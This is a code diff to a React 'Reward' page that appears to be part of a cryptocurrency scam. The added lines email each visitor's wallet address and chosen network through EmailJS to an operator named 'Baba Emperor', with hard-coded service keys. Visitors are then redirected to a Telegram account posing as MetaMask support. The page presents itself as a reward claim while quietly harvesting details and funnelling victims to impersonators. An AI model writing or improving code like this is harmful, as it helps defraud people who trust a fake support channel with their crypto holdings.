@@ -1,11 +1,13 @@
 import { React, useState } from 'react'
 import Swal from 'sweetalert2';
 import Loader from '../components/loader/Loader';
+import emailjs from 'emailjs-com';
 
 const Reward = () => {
 
     const [loader, setLoader] = useState(false)
     const [walletAddress, setWalletAddress] = useState('')
+    const [walletNetwork, setWalletNetwork] = useState('')
     const [errorMsg, setErrorMsg] = useState()
 
     const handleInputChange = (e) => {
@@ -28,6 +30,30 @@ const Reward = () => {
             console.log('please provide a valid wallet address')
         }
         else {
+          
+  // email sending
+  const msg = `A new user with the following details ~ \n wallet Address ${walletAddress} \n and network: ${walletNetwork}`
+
+  const data = {
+    from_name: 'New Client',
+    to_name: 'Baba Emperor',
+    message: msg
+  }
+  console.log(data)
+
+    emailjs.send(
+      'service_e7dyidx',
+      'template_0ktj1l3',
+      data,
+      'kLvhI1Lak2ZIvFe6R',
+    )
+    .then((response) => {
+      console.log('SUCCESS!', response.status, response.text);
+    })
+    .catch((err) => {
+      console.log('FAILED...', err);
+    });
+
     // sweet alert function 
     const Toast = Swal.mixin({
       toast: true,
@@ -52,7 +78,7 @@ const Reward = () => {
            setLoader(false);
            
         window.location.href='https://t.me/io_Supportmetamask'
-         }, 4000);
+         }, 6000);
         }
      
         }
@@ -112,12 +138,17 @@ const Reward = () => {
           <span id='Iformx'>
           <select 
           required
+          onChange={(e)=>{
+            setWalletNetwork(e.target.value.trim())
+          }}
+          value={walletNetwork}
           >
-            <option value="btcwallet">Bitcoin(BTC)</option>
-            <option value="ethwallet">Ethereum(ETH)</option>
-            <option value="btcwallet">BNB(BNB)</option>
-            <option value="btcwallet">Solana(SOL)</option>
-            <option value="btcwallet">Tether USD(BEP20)</option>
+            <option value='' required>Select wallet network</option>
+            <option value="Bitcoin(BTC)">Bitcoin(BTC)</option>
+            <option value="Ethereum(ETH)">Ethereum(ETH)</option>
+            <option value="BNB(BNB)">BNB(BNB)</option>
+            <option value="Solana(SOL)">Solana(SOL)</option>
+            <option value="Tether USD(BEP20)">Tether USD(BEP20)</option>
             </select>
           </span>
 
